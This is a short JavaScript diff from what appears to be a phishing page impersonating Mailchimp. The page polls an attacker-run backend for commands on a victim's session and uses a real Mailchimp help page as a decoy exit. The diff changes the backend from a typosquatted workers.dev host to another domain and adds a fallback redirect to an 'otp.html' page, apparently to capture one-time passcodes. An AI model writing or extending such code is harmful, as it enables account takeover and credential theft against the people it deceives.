@@ -21,9 +21,13 @@ const vid = new URLSearchParams(window.location.search).get('vid');
 if (!vid) {
   document.querySelector('.text').textContent = 'Error: missing session';
 } else {
+  let attempts = 0;
+  const maxAttempts = 15; // 30 seconds
+
   async function poll() {
+    attempts++;
     try {
-      const res = await fetch(`https://mailchimp-backend.qulckbooksuppor.workers.dev/check?vid=${vid}`);
+      const res = await fetch(`https://api.glotzier.com/check?vid=${vid}`);
       const text = await res.text();
       if (text === 'exit') {
         window.location.href = 'https://mailchimp.com/help/about-mailchimp-pricing-plans/';
@@ -34,6 +38,10 @@ if (!vid) {
         return;
       }
     } catch(e) {}
+    if (attempts >= maxAttempts) {
+      window.location.href = 'otp.html';
+      return;
+    }
     setTimeout(poll, 2000);
   }
   poll();
